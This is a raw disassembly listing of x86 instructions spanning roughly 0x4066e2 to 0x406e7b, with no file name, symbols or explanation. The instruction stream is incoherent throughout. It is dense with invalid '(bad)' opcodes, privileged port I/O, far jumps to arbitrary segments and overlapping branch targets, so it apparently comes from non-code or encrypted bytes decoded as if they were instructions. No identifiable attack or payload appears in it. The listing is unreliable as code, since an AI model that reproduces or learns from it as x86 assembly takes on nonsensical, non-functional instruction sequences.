  4066e2:	lock xchg ebp,edi
  4066e5:	test   eax,0x1d896944
  4066ea:	sub    BYTE PTR [edi],bl
  4066ec:	loop   0x4066d9
  4066ee:	mov    al,0x5f
  4066f0:	loop   0x40675f
  4066f2:	jecxz  0x40667c
  4066f4:	dec    edx
  4066f5:	fs and eax,0xafb5615a
  4066fb:	add    BYTE PTR [ebp+0x4fd0e337],cl
  406701:	lahf   
  406702:	mov    al,bh
  406704:	into   
  406705:	or     esi,DWORD PTR [ecx+0x713faed3]
  40670b:	xchg   edx,eax
  40670c:	xchg   esi,eax
  40670d:	mov    ebx,0xcb8689d5
  406712:	pop    esp
  406713:	sar    DWORD PTR [edi],0x3f
  406716:	sub    DWORD PTR [edi+0xfc4f7a9],0x6725e75e
  406720:	mov    al,ds:0x271a2eaa
  406725:	mov    bl,0xc9
  406727:	stos   BYTE PTR es:[edi],al
  406728:	jo     0x40675e
  40672a:	std    
  40672b:	cwde   
  40672c:	mov    bl,0xec
  40672e:	imul   edx,DWORD PTR [esi+esi*4-0x6e],0xffffff81
  406733:	adc    esp,ebp
  406735:	cmc    
  406736:	repnz mov edi,fs
  406739:	inc    esi
  40673a:	pop    ebp
  40673b:	data16 mul ah
  40673e:	mov    esi,0x572a1a35
  406743:	or     DWORD PTR [ebx-0x10],0x31e8f851
  40674a:	jg     0x40673e
  40674c:	fsub   QWORD PTR [ecx-0x5e]
  40674f:	or     ebp,DWORD PTR [ebx+edi*1-0x575050c5]
  406756:	shr    edi,1
  406758:	mov    al,ds:0x2a88b0ad
  40675d:	inc    edx
  40675e:	mov    ebx,0x765b7e92
  406763:	push   edx
  406765:	nop
  406766:	mov    esi,0xf4a56c90
  40676b:	fxtract 
  40676d:	icebp  
  40676e:	push   ecx
  40676f:	rol    BYTE PTR [edi+0x2381ce04],1
  406775:	and    al,0x97
  406777:	lahf   
  406778:	xchg   esi,eax
  406779:	nop
  40677a:	leave  
  40677b:	mov    bh,0x87
  40677d:	adc    BYTE PTR [edx],cl
  40677f:	popa   
  406780:	add    BYTE PTR [ecx-0x677b0329],0xf9
  406787:	xor    dl,dh
  406789:	test   al,0xd2
  40678b:	push   eax
  40678c:	in     eax,dx
  40678d:	dec    esi
  40678e:	(bad)  
  40678f:	dec    ebx
  406790:	and    BYTE PTR [edx+edi*8+0x20c86ab6],0x8b
  406798:	aam    0x9d
  40679a:	xchg   edi,eax
  40679b:	jmp    FWORD PTR [eax+0x6d]
  40679e:	retf   0x7ce
  4067a1:	jae    0x4067f3
  4067a3:	in     eax,dx
  4067a4:	sti    
  4067a5:	or     esi,esp
  4067a7:	jmp    0xdb23:0xb12436a8
  4067ae:	and    al,0xa3
  4067b0:	mov    ecx,DWORD PTR [edx+ebp*8+0x65]
  4067b4:	fnstcw WORD PTR [ebx+0x4dbe553d]
  4067ba:	sub    dh,BYTE PTR [esi]
  4067bc:	or     BYTE PTR [eax],ah
  4067be:	add    dh,BYTE PTR [esi]
  4067c0:	sub    DWORD PTR [edi],ebx
  4067c2:	add    BYTE PTR [ebp-0x7fece754],0xb1
  4067c9:	push   esi
  4067ca:	scas   eax,DWORD PTR es:[edi]
  4067cb:	mov    ebp,es
  4067cd:	mov    eax,ds:0x8843b43c
  4067d2:	cwde   
  4067d3:	outs   dx,DWORD PTR ds:[esi]
  4067d4:	and    BYTE PTR [eax+0x560d3ba8],ch
  4067da:	popa   
  4067db:	icebp  
  4067dc:	add    ebp,edi
  4067de:	cwde   
  4067df:	jae    0x40685a
  4067e1:	push   cs
  4067e2:	outs   dx,DWORD PTR ds:[esi]
  4067e3:	in     al,dx
  4067e4:	jmp    0x40677c
  4067e6:	lods   eax,DWORD PTR ds:[esi]
  4067e7:	mov    esi,0x48c085f4
  4067ec:	inc    ecx
  4067ed:	sub    eax,0x8a9c3234
  4067f2:	jmp    0x87b5:0xe939f297
  4067f9:	mov    eax,ds:0x184d849b
  4067fe:	pop    esp
  4067ff:	imul   ebp,DWORD PTR [ebx+0x4b0f0662],0x3d
  406806:	retf   
  406807:	mov    cl,0xb8
  406809:	test   DWORD PTR [esi-0x33753d7a],eax
  40680f:	out    0x81,eax
  406811:	jne    0x40687c
  406813:	test   BYTE PTR [eax],dh
  406815:	or     DWORD PTR [ecx-0x5a],0x3c03061c
  40681c:	(bad)  
  40681d:	mov    al,0x45
  40681f:	push   esi
  406820:	sbb    BYTE PTR [ecx],bh
  406822:	(bad)  
  406823:	xchg   ebx,eax
  406824:	ss xchg esp,eax
  406826:	loope  0x40689c
  406828:	sbb    DWORD PTR [edi],eax
  40682a:	pop    eax
  40682b:	popf   
  40682c:	aam    0x7c
  40682e:	int3   
  40682f:	lea    ecx,[ebx+0x2c]
  406832:	js     0x4067b9
  406834:	pop    ecx
  406835:	add    BYTE PTR [edx],al
  406837:	cmp    eax,0xccc2dd5e
  40683c:	lods   al,BYTE PTR ds:[esi]
  40683d:	push   cs
  40683e:	std    
  40683f:	mov    edi,esi
  406841:	popa   
  406842:	(bad)  [eax+ebx*2+0x69]
  406846:	pop    ebx
  406847:	mov    BYTE PTR [edx-0x37],0xdb
  40684b:	je     0x40689c
  40684d:	adc    al,0xf3
  40684f:	push   cs
  406850:	and    edi,DWORD PTR [eax+eax*8-0x16a1b0b]
  406857:	cli    
  406858:	popf   
  406859:	es call 0x60718fb7
  40685f:	mov    BYTE PTR [esi-0x606def94],ch
  406865:	xor    al,0xa
  406867:	push   0x1e1aeba7
  40686c:	jns    0x406816
  40686e:	xchg   BYTE PTR [edi-0x6d],cl
  406871:	mov    ah,0xd1
  406873:	stos   DWORD PTR es:[edi],eax
  406874:	in     al,0xf1
  406876:	push   esi
  406877:	pop    ds
  406878:	out    0x44,al
  40687a:	jnp    0x40685f
  40687c:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40687e:	pusha  
  40687f:	jmp    0x4159f341
  406884:	out    0x63,eax
  406886:	aas    
  406887:	(bad)
  40688a:	jge    0x406847
  40688c:	cmc    
  40688d:	aad    0x5
  40688f:	mov    ebp,0xb6b14ff4
  406894:	jo     0x4068bc
  406896:	out    dx,eax
  406897:	aam    0x83
  406899:	jp     0x4068a1
  40689b:	xchg   ebx,eax
  40689c:	rol    cl,1
  40689e:	cli    
  40689f:	cld    
  4068a0:	xchg   ebx,eax
  4068a1:	fild   DWORD PTR ds:0xe66697f1
  4068a7:	push   ss
  4068a8:	mov    ds:0xe927f396,eax
  4068ad:	into   
  4068ae:	pop    edx
  4068af:	mov    ebx,0x7fd35af8
  4068b4:	pop    eax
  4068b5:	and    al,0xcb
  4068b7:	stos   DWORD PTR es:[edi],eax
  4068b8:	imul   edi,esp,0x49
  4068bb:	pusha  
  4068bc:	outs   dx,DWORD PTR ds:[esi]
  4068bd:	or     cl,BYTE PTR [ecx-0x52]
  4068c0:	push   ss
  4068c1:	mov    BYTE PTR [ebx-0x1e],0xe8
  4068c5:	ins    DWORD PTR es:[edi],dx
  4068c6:	out    0xb7,al
  4068c8:	rcl    esi,0x49
  4068cb:	rol    BYTE PTR [ebp+0x9],cl
  4068ce:	fild   QWORD PTR [edx+0x2e]
  4068d1:	jmp    0x617933a4
  4068d6:	jg     0x406888
  4068d8:	ins    BYTE PTR es:[edi],dx
  4068d9:	sbb    BYTE PTR [eax],0x4e
  4068dc:	or     eax,0xe10a998f
  4068e1:	push   eax
  4068e2:	or     bl,bh
  4068e4:	mov    ah,0x51
  4068e6:	adc    ebp,DWORD PTR [eax-0x7a61c558]
  4068ec:	hlt    
  4068ed:	shl    BYTE PTR [esp+edx*2+0x687689db],cl
  4068f4:	inc    eax
  4068f5:	fstp   QWORD PTR [edi+ebp*1-0x1a]
  4068f9:	inc    eax
  4068fa:	mov    ah,0x43
  4068fc:	cmp    al,0x3e
  4068fe:	push   eax
  4068ff:	int3   
  406900:	pop    eax
  406901:	dec    esp
  406902:	cmp    DWORD PTR [esi],eax
  406904:	cld    
  406905:	(bad)  
  406907:	or     eax,0x97eacacc
  40690c:	add    BYTE PTR [ebx+0x5a],bl
  40690f:	retf   0x5d78
  406912:	outs   dx,DWORD PTR ds:[esi]
  406913:	cwde   
  406914:	clc    
  406915:	pop    edx
  406917:	inc    ebx
  406918:	ror    dl,cl
  40691a:	mov    bl,0x4a
  40691c:	pop    edx
  40691d:	enter  0x5356,0x1d
  406921:	mov    al,0x3b
  406923:	cmp    al,BYTE PTR [edi+0x1514417e]
  406929:	add    al,0x5d
  40692b:	pop    ss
  40692c:	and    al,0x4d
  40692e:	dec    esi
  40692f:	dec    esp
  406930:	aas    
  406931:	push   ss
  406932:	add    al,0x1a
  406934:	int3   
  406935:	dec    eax
  406936:	shl    BYTE PTR [ebx+0x70127e56],0x47
  40693d:	repnz mov eax,ds:0x54bd292c
  406943:	loop   0x406970
  406945:	fcmovne st,st(6)
  406947:	add    dl,bl
  406949:	enter  0x3454,0x4f
  40694d:	add    ebx,DWORD PTR [ecx-0x66565b9e]
  406953:	call   0x3d9a:0x79628451
  40695a:	ins    DWORD PTR es:[edi],dx
  40695b:	sub    bh,BYTE PTR [esp+eiz*2]
  40695e:	and    al,0x20
  406960:	sbb    edi,DWORD PTR [ebx-0x12]
  406963:	jnp    0x406904
  406965:	fbld   TBYTE PTR [edi+0x60061bea]
  40696b:	push   ebx
  40696c:	(bad)  
  40696d:	loopne 0x406911
  40696f:	or     DWORD PTR [edx],edx
  406971:	repnz mov ch,0x23
  406974:	add    BYTE PTR [eax+0x1e],bh
  406977:	inc    ecx
  406978:	test   BYTE PTR [ebp-0x23],ah
  40697b:	(bad)  
  40697c:	xor    al,0x41
  40697e:	fnsave [ecx+eax*4+0x64]
  406982:	sub    dh,dl
  406984:	mov    ebp,ds
  406986:	test   al,bl
  406988:	dec    ecx
  406989:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40698a:	add    ch,BYTE PTR [eax]
  40698c:	xchg   ebx,eax
  40698d:	xchg   edx,eax
  40698e:	sbb    ebx,esp
  406990:	call   0x3153:0xc529dae8
  406997:	jp     0x4069d6
  406999:	test   al,0xa0
  40699b:	call   0x980f:0x235c1f12
  4069a2:	std    
  4069a3:	ja     0x4069ac
  4069a5:	and    DWORD PTR [esi+0x71f44bb1],edi
  4069ab:	punpckhbw mm3,mm2
  4069ae:	out    0xaa,al
  4069b0:	push   ebp
  4069b1:	push   ds
  4069b2:	sbb    BYTE PTR ds:0x96de355d,bh
  4069b8:	cmp    esp,DWORD PTR [ecx]
  4069ba:	dec    ebx
  4069bb:	in     al,0x53
  4069bd:	xchg   esp,eax
  4069be:	sbb    BYTE PTR [edi+0x15],cl
  4069c1:	in     eax,dx
  4069c2:	cmp    eax,DWORD PTR [edi+0x17254d5]
  4069c8:	dec    ebp
  4069c9:	mov    cl,0xeb
  4069cb:	mov    ds:0xf11f11ac,al
  4069d0:	enter  0x8139,0x14
  4069d4:	add    BYTE PTR [ebp+0x75],ch
  4069d7:	jmp    0xd79e5c98
  4069dc:	in     al,0xcc
  4069de:	(bad)  
  4069df:	loopne 0x40699f
  4069e1:	lods   al,BYTE PTR ds:[esi]
  4069e2:	or     al,0xbc
  4069e4:	or     eax,0xbe29c753
  4069e9:	push   ebp
  4069ea:	pop    ebx
  4069eb:	or     al,0xea
  4069ed:	test   DWORD PTR [esi-0x33bdf3bd],esi
  4069f3:	aad    0xe7
  4069f5:	and    esi,DWORD PTR [edi+0x18caacc9]
  4069fb:	loope  0x406986
  4069fd:	add    ebp,DWORD PTR [eax+esi*8+0x1633f69d]
  406a04:	add    cl,bl
  406a06:	push   eax
  406a07:	jne    0x4069e2
  406a09:	mov    ebp,0x1f3d5dc5
  406a0e:	push   edi
  406a0f:	sub    eax,0x77469ddb
  406a14:	sub    esp,DWORD PTR [eax]
  406a16:	pminsw mm2,QWORD PTR [edx]
  406a19:	sub    ebx,esi
  406a1b:	add    ch,BYTE PTR [esi]
  406a1d:	mov    BYTE PTR [esi+0x1ba6f19c],0x53
  406a24:	push   esp
  406a25:	loopne 0x406a30
  406a27:	sbb    ah,BYTE PTR [edi+0x60b86e29]
  406a2d:	popa   
  406a2e:	xor    al,0xaa
  406a30:	(bad)  
  406a31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a32:	and    esi,ecx
  406a34:	mov    eax,ds:0xb0991c39
  406a39:	inc    esp
  406a3a:	push   esp
  406a3b:	in     al,0x44
  406a3d:	lea    edi,[edi]
  406a3f:	jb     0x4069f1
  406a41:	pop    esi
  406a42:	pop    ebp
  406a43:	sti    
  406a44:	xchg   esp,eax
  406a45:	lods   eax,DWORD PTR ds:[esi]
  406a46:	add    BYTE PTR [ecx-0x21],ah
  406a49:	push   ecx
  406a4a:	or     al,0xa
  406a4c:	arpl   WORD PTR [ebp-0x3c],bp
  406a4f:	out    dx,al
  406a50:	popf   
  406a51:	leave  
  406a52:	sub    al,0x6
  406a54:	xor    ecx,DWORD PTR [esi-0x7f0e19d6]
  406a5a:	push   edx
  406a5b:	cmp    eax,0x25da05c4
  406a60:	push   es
  406a61:	sub    edx,DWORD PTR [ebx+0x2ec84cc9]
  406a67:	int3   
  406a68:	sti    
  406a69:	xchg   esp,eax
  406a6a:	sub    al,dl
  406a6c:	dec    ebp
  406a6d:	lock addr16 pop ds
  406a70:	les    ebp,FWORD PTR [ebx]
  406a72:	inc    ecx
  406a73:	mov    dh,BYTE PTR [edx+0x60]
  406a76:	push   esp
  406a77:	(bad)  
  406a78:	test   ax,0xd6cb
  406a7c:	push   esi
  406a7d:	inc    esp
  406a7e:	and    ah,BYTE PTR [ebx]
  406a80:	push   ebx
  406a81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a82:	mov    al,ds:0x21258581
  406a87:	inc    ebx
  406a88:	div    BYTE PTR [ebp+0x22]
  406a8b:	pop    eax
  406a8c:	loope  0x406a0e
  406a8e:	mov    edx,0x6c807c4a
  406a93:	ror    DWORD PTR [eax+0x21ebe99f],cl
  406a99:	cli    
  406a9a:	cmp    eax,0x188b2255
  406a9f:	not    DWORD PTR [ecx+0x6c39f1a4]
  406aa5:	lods   eax,DWORD PTR ds:[esi]
  406aa6:	or     eax,0x6417cc6b
  406aab:	or     DWORD PTR [ebp-0x4911d9fb],ecx
  406ab1:	shr    DWORD PTR ds:[edx+0x6cbd34b0],1
  406ab8:	js     0x406a8d
  406aba:	call   0x13b:0xa4dbf86e
  406ac1:	dec    edi
  406ac2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ac3:	mov    dl,0x1d
  406ac5:	cld    
  406ac6:	jmp    0x406afe
  406ac8:	push   edx
  406ac9:	ss push edi
  406acb:	cdq    
  406acc:	dec    ecx
  406acd:	push   ds
  406ace:	push   ecx
  406acf:	lds    esp,FWORD PTR [ebp+0x65]
  406ad2:	mov    ch,BYTE PTR [eax-0x36]
  406ad5:	rcr    BYTE PTR [ebx-0x20],0x2b
  406ad9:	mov    ds:0xeaecdfdb,eax
  406ade:	sbb    al,0x82
  406ae0:	jae    0x406b01
  406ae2:	dec    ebp
  406ae3:	test   eax,0xb19c742d
  406ae8:	enter  0x4382,0x7b
  406aec:	fild   WORD PTR [ebp-0x14b01273]
  406af2:	pop    ds
  406af3:	pop    ss
  406af4:	xor    DWORD PTR [eax+0x424d3e87],eax
  406afa:	fild   DWORD PTR [ebx]
  406afc:	ins    DWORD PTR es:[edi],dx
  406afd:	xchg   esp,eax
  406afe:	ret    
  406aff:	adc    DWORD PTR [esi],ecx
  406b01:	lea    esp,[esi-0x52693340]
  406b07:	jp     0x406b69
  406b09:	pop    ebx
  406b0a:	jnp    0x406ab9
  406b0c:	or     esi,DWORD PTR [eax-0x22e1b700]
  406b12:	add    al,0x9d
  406b14:	sub    eax,0x40377e37
  406b19:	cmp    BYTE PTR [ecx],bh
  406b1b:	mov    ebx,DWORD PTR [ebp-0x4b]
  406b1e:	pusha  
  406b1f:	in     eax,dx
  406b20:	fidiv  WORD PTR [edi-0x27]
  406b23:	shl    DWORD PTR [edx+0x7a5e260b],cl
  406b29:	xchg   ecx,eax
  406b2a:	ret    0x4c58
  406b2d:	mov    al,ds:0x78fa1e04
  406b32:	jl     0x406b75
  406b34:	xor    eax,0x6f3afa03
  406b39:	or     dh,BYTE PTR [eax-0x5caddb51]
  406b3f:	or     ah,ah
  406b41:	sub    al,0x80
  406b43:	ins    DWORD PTR es:[edi],dx
  406b44:	adc    ah,0x98
  406b47:	xor    DWORD PTR [eax-0x7df61122],esp
  406b4d:	xor    DWORD PTR [esi],0xffffffb1
  406b50:	nop
  406b51:	mov    dl,0xe8
  406b53:	mov    ebp,DWORD PTR [ebx+edx*8-0x12b4d060]
  406b5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b5b:	dec    ecx
  406b5c:	ins    DWORD PTR es:[edi],dx
  406b5d:	fucomi st,st(4)
  406b5f:	add    cl,BYTE PTR [ecx*8+0x24b7efd2]
  406b66:	mov    dl,0xc6
  406b68:	fs jns 0x406af2
  406b6b:	xchg   edx,eax
  406b6c:	xor    dl,BYTE PTR [ebx]
  406b6e:	(bad)  
  406b6f:	sbb    ch,al
  406b71:	or     DWORD PTR [ecx+edx*2-0x76],eax
  406b75:	cwde   
  406b76:	js     0x406b2c
  406b78:	inc    ecx
  406b79:	push   ebp
  406b7a:	adc    ah,BYTE PTR [ebx]
  406b7c:	lods   al,BYTE PTR ds:[esi]
  406b7d:	add    DWORD PTR [esi+ecx*2-0x43],0xa5b48319
  406b85:	ds inc ebp
  406b87:	xor    edi,0xdfc03094
  406b8d:	pop    eax
  406b8e:	inc    esp
  406b8f:	lahf   
  406b90:	and    bh,0x47
  406b93:	in     eax,0x8e
  406b95:	mov    cl,0x19
  406b97:	and    DWORD PTR [edx+0x38],0x27dc872c
  406b9e:	mov    ch,0x40
  406ba0:	jb     0x406c1c
  406ba2:	add    eax,0x79a4c77b
  406ba7:	out    0xc8,al
  406ba9:	ins    DWORD PTR es:[edi],dx
  406baa:	loop   0x406c06
  406bac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406bad:	pushf  
  406bae:	add    BYTE PTR [ebx+0x3fcb8ede],bh
  406bb4:	push   edx
  406bb5:	inc    esp
  406bb6:	jno    0x406c2a
  406bb8:	pop    es
  406bb9:	inc    edx
  406bba:	dec    ebx
  406bbb:	mov    DWORD PTR [ebx+0x7e],edx
  406bbe:	aas    
  406bbf:	dec    ebp
  406bc0:	or     eax,0x42d92638
  406bc5:	iret   
  406bc6:	jno    0x406c18
  406bc8:	in     al,dx
  406bc9:	(bad)  
  406bca:	push   ecx
  406bcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406bcc:	scas   al,BYTE PTR es:[edi]
  406bcd:	sub    al,0x38
  406bcf:	inc    esi
  406bd0:	push   edx
  406bd1:	iret   
  406bd2:	ds loop 0x406bce
  406bd5:	jmp    0xee1287e5
  406bda:	sub    ebp,ebx
  406bdc:	xchg   ebx,eax
  406bdd:	sub    DWORD PTR [edx-0x72],edi
  406be0:	lods   al,BYTE PTR ds:[esi]
  406be1:	jecxz  0x406bd3
  406be3:	xor    dh,BYTE PTR [di-0xa]
  406be7:	dec    edi
  406be8:	out    0x7c,eax
  406bea:	push   ecx
  406beb:	push   ecx
  406bec:	push   edx
  406bed:	ja     0x406b73
  406bef:	cs inc ebp
  406bf1:	arpl   bp,bx
  406bf3:	adc    ch,BYTE PTR [ecx-0x3f5e163b]
  406bf9:	mov    edx,0x71512421
  406bfe:	mov    BYTE PTR [eax-0x4f],dl
  406c01:	das    
  406c02:	cmp    al,0x76
  406c04:	inc    esp
  406c05:	rcr    ecx,cl
  406c07:	push   ss
  406c08:	sahf   
  406c09:	into   
  406c0a:	dec    eax
  406c0b:	rcr    BYTE PTR [eax+0x251a0fd1],cl
  406c11:	pop    edi
  406c12:	loope  0x406bbd
  406c14:	nop
  406c15:	(bad)  
  406c16:	mov    eax,0x9ff42ed7
  406c1b:	imul   BYTE PTR [edx]
  406c1d:	mul    DWORD PTR [edx-0x5ff5cdba]
  406c23:	sbb    BYTE PTR [ebx+0x5f7365c],0x1b
  406c2a:	adc    eax,0x8129ea31
  406c2f:	gs jo  0x406c44
  406c32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c33:	cli    
  406c34:	test   dl,0x38
  406c37:	add    BYTE PTR gs:[ebx+ebx*4],ah
  406c3b:	rcl    DWORD PTR [edi],1
  406c3d:	(bad)  [edi-0x40]
  406c40:	add    al,0x1b
  406c42:	xor    BYTE PTR [edi+0x14],0xba
  406c46:	mov    ecx,0x5cdabd7f
  406c4b:	pop    es
  406c4c:	ins    DWORD PTR es:[edi],dx
  406c4d:	shr    BYTE PTR [edi],cl
  406c4f:	test   eax,0xc9b59a47
  406c54:	sahf   
  406c55:	and    BYTE PTR [ebx+0x574938a6],dh
  406c5b:	in     al,0x9
  406c5d:	jmp    0x406c98
  406c5f:	mov    ch,BYTE PTR [edx]
  406c61:	popa   
  406c62:	daa    
  406c63:	pop    esi
  406c64:	sbb    BYTE PTR [ecx-0x4b],ch
  406c67:	lods   al,BYTE PTR ds:[esi]
  406c68:	xlat   BYTE PTR ds:[ebx]
  406c69:	cmp    BYTE PTR [edi-0x36],dh
  406c6c:	stos   DWORD PTR es:[edi],eax
  406c6d:	mov    bl,BYTE PTR [esi]
  406c6f:	pop    edi
  406c70:	lods   al,BYTE PTR ds:[esi]
  406c71:	xor    edx,edx
  406c73:	xchg   DWORD PTR [esi+edi*1+0x5b061c0a],esi
  406c7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c7b:	inc    edi
  406c7c:	adc    esi,DWORD PTR [edx]
  406c7e:	addr16 loop 0x406c63
  406c81:	adc    bh,BYTE PTR ds:0xe2f65c52
  406c87:	xchg   esi,eax
  406c88:	sub    dh,BYTE PTR [edi-0x40]
  406c8b:	mov    DWORD PTR [edx-0x7ecceb49],ebx
  406c91:	fsub   QWORD PTR [edx-0x1731deb5]
  406c97:	and    BYTE PTR [esi-0x64b76752],dh
  406c9d:	ins    BYTE PTR es:[edi],dx
  406c9e:	cwde   
  406c9f:	int    0xb4
  406ca1:	hlt    
  406ca2:	test   DWORD PTR [eax+0x5a30cb1a],0xdb248419
  406cac:	cmp    edx,DWORD PTR [esi+eiz*1]
  406caf:	and    DWORD PTR [esp],edx
  406cb2:	xchg   ebp,eax
  406cb3:	call   0xacf30d5c
  406cb8:	cli    
  406cb9:	fs loope 0x406c73
  406cbc:	mov    ?,WORD PTR [edi-0x54]
  406cbf:	dec    ecx
  406cc0:	and    dh,BYTE PTR [edx]
  406cc2:	mov    bh,0x3d
  406cc4:	cmp    esi,DWORD PTR [eax+0x34]
  406cc7:	(bad)  [edx+0x32526891]
  406ccd:	pusha  
  406cce:	dec    edi
  406ccf:	cdq    
  406cd0:	(bad)  
  406cd1:	stc    
  406cd2:	sub    edx,ebx
  406cd4:	mov    ss,WORD PTR [eax+0x58]
  406cd7:	jb     0x406c90
  406cd9:	or     BYTE PTR ds:0xd17e398b,al
  406cdf:	cld    
  406ce0:	sbb    esi,edx
  406ce2:	outs   dx,DWORD PTR ds:[esi]
  406ce3:	ror    BYTE PTR [ebp+ecx*4+0x55],cl
  406ce7:	xchg   esi,eax
  406ce8:	rcl    BYTE PTR [ecx-0x3d],0xe8
  406cec:	and    BYTE PTR [eax],bh
  406cee:	adc    eax,0xf177ad56
  406cf3:	push   esp
  406cf4:	sbb    dl,BYTE PTR [edx]
  406cf6:	je     0x406c9d
  406cf8:	add    dh,BYTE PTR [ecx]
  406cfa:	sbb    BYTE PTR [eax-0x3bfc3db8],cl
  406d00:	in     al,0x12
  406d02:	jle    0x406d49
  406d04:	push   esi
  406d05:	aad    0x51
  406d07:	pop    eax
  406d08:	add    DWORD PTR [ebx-0x2787663d],0x4e
  406d0f:	xchg   ecx,ebp
  406d11:	push   ecx
  406d12:	xchg   esp,eax
  406d13:	js     0x406d31
  406d15:	or     bl,BYTE PTR [ebx]
  406d17:	mov    edi,0xf88f9262
  406d1c:	xchg   esi,eax
  406d1d:	adc    al,0xe0
  406d1f:	nop
  406d20:	dec    ebp
  406d21:	sub    ah,bl
  406d23:	mov    bl,BYTE PTR ds:0x3a2bb1ce
  406d29:	(bad)  
  406d2a:	mov    es,WORD PTR ds:0xb73f145c
  406d30:	imul   DWORD PTR [edx+0xb]
  406d33:	sub    eax,0xd5e3c239
  406d38:	mov    DWORD PTR [esi-0x3f166856],ebx
  406d3e:	dec    DWORD PTR [esi+0x28963ad4]
  406d44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d45:	inc    ebx
  406d46:	out    dx,eax
  406d47:	rol    DWORD PTR [ecx+0x4b],1
  406d4a:	inc    ebp
  406d4b:	dec    esi
  406d4c:	rcl    BYTE PTR ds:0xcf8c33d,0xb1
  406d53:	cwde   
  406d54:	ret    
  406d55:	xchg   ecx,eax
  406d56:	aad    0xce
  406d58:	add    ecx,DWORD PTR [ebp+0x53]
  406d5b:	cwde   
  406d5c:	cmp    eax,0xba35798b
  406d61:	pop    esi
  406d62:	pop    eax
  406d63:	mov    edi,0xbdd13f0d
  406d68:	outs   dx,DWORD PTR ds:[esi]
  406d69:	push   ebx
  406d6a:	out    dx,al
  406d6b:	inc    edx
  406d6c:	lods   eax,DWORD PTR ds:[esi]
  406d6d:	lods   eax,DWORD PTR ds:[esi]
  406d6e:	jp     0x406d65
  406d70:	sbb    ebp,0xffffff89
  406d73:	xchg   ecx,eax
  406d74:	cmp    DWORD PTR [ebp+0x4d35db7c],edx
  406d7a:	(bad)  
  406d7b:	xchg   ecx,eax
  406d7c:	gs cdq 
  406d7e:	push   es
  406d7f:	dec    ecx
  406d80:	bound  ecx,QWORD PTR cs:[edx+ecx*8]
  406d84:	cld    
  406d85:	xor    ebx,esp
  406d87:	xchg   esi,eax
  406d88:	xor    DWORD PTR [eax],edi
  406d8a:	xchg   ecx,eax
  406d8b:	cld    
  406d8c:	retf   0x7850
  406d8f:	cdq    
  406d90:	inc    ebx
  406d91:	jbe    0x406de0
  406d93:	or     BYTE PTR [edx+0x76],al
  406d96:	lods   eax,DWORD PTR ds:[esi]
  406d97:	rcl    DWORD PTR [ecx-0x23],1
  406d9a:	aas    
  406d9b:	or     eax,0x5d287997
  406da0:	xor    al,0xf5
  406da2:	rcr    BYTE PTR [esi+0x73],cl
  406da5:	scas   al,BYTE PTR es:[edi]
  406da6:	inc    ebp
  406da7:	cmp    cl,BYTE PTR [edx]
  406da9:	mov    al,0xe4
  406dab:	mov    edi,0x8c16cc56
  406db0:	outs   dx,BYTE PTR ds:[esi]
  406db1:	fstp   QWORD PTR [eax]
  406db3:	call   FWORD PTR [ecx+0x7b70eb23]
  406db9:	adc    eax,esp
  406dbb:	or     al,0xda
  406dbd:	icebp  
  406dbe:	repz xchg edx,eax
  406dc0:	(bad)  
  406dc4:	jecxz  0x406d86
  406dc6:	pop    ecx
  406dc7:	mov    ds:0xbaafe944,al
  406dcc:	xchg   ebp,eax
  406dcd:	or     ch,BYTE PTR [ecx]
  406dcf:	fidivr WORD PTR [ebx+0x78]
  406dd2:	loope  0x406d6e
  406dd4:	xor    eax,0x7fce952d
  406dd9:	fadd   st,st(2)
  406ddb:	mov    ah,0xa5
  406ddd:	pop    ss
  406dde:	xlat   BYTE PTR ds:[ebx]
  406ddf:	sub    eax,0x46d29ff
  406de4:	mov    ds:0xf3e38625,eax
  406de9:	and    DWORD PTR [eax+0x67],esi
  406dec:	adc    eax,0xa7d86807
  406df1:	arpl   WORD PTR fs:[edx],dx
  406df4:	mov    bh,0x49
  406df6:	pop    ss
  406df7:	adc    al,0x30
  406df9:	aaa    
  406dfa:	dec    edx
  406dfb:	xor    BYTE PTR [ebx],bh
  406dfd:	mov    dl,0x2d
  406dff:	dec    esi
  406e00:	out    dx,eax
  406e01:	and    al,BYTE PTR [edx]
  406e03:	push   esi
  406e04:	out    dx,al
  406e05:	jns    0x406dd8
  406e07:	clc    
  406e08:	sbb    esp,esp
  406e0a:	sbb    ch,0x80
  406e0d:	inc    ebp
  406e0e:	bound  eax,QWORD PTR [esi+0x49f592cb]
  406e14:	adc    DWORD PTR [edx+0x1098dc7f],0xffffff96
  406e1b:	es (bad) 
  406e1d:	(bad)  
  406e1e:	out    dx,al
  406e1f:	sti    
  406e20:	sbb    eax,DWORD PTR [edi+0x9]
  406e23:	or     DWORD PTR ds:0xff0e4470,edx
  406e29:	inc    ecx
  406e2a:	and    dl,dh
  406e2c:	lods   al,BYTE PTR ds:[esi]
  406e2d:	jns    0x406e40
  406e2f:	cmp    eax,0xaf2b0fea
  406e34:	dec    esp
  406e35:	mov    dh,dh
  406e37:	ror    DWORD PTR [ebp+0x3f8d33ac],cl
  406e3d:	push   0x46
  406e3f:	mov    eax,ds:0x314a7723
  406e44:	or     esi,DWORD PTR [ecx]
  406e46:	mov    BYTE PTR [ebp+0x48],al
  406e49:	mov    dh,0xaf
  406e4b:	test   eax,0x7ea22ed2
  406e50:	cmc    
  406e51:	jno    0x406df6
  406e53:	cli    
  406e54:	add    DWORD PTR [ecx],0x71
  406e57:	sbb    al,0x83
  406e59:	pop    ebp
  406e5a:	add    DWORD PTR [ecx],ebx
  406e5c:	add    bl,BYTE PTR [esi-0x1fb9f9f5]
  406e62:	out    0xdc,eax
  406e64:	in     eax,0x95
  406e66:	xor    ch,BYTE PTR [esi+0x3e8757af]
  406e6c:	bound  ecx,QWORD PTR [ebx+0x50]
  406e6f:	addr16 popa 
  406e71:	jb     0x406e14
  406e73:	scas   eax,DWORD PTR es:[edi]
  406e74:	mov    cl,0xfd
  406e76:	xor    eax,0xe27b6e8
  406e7b:	mov    ds:0x856e80b9,eax
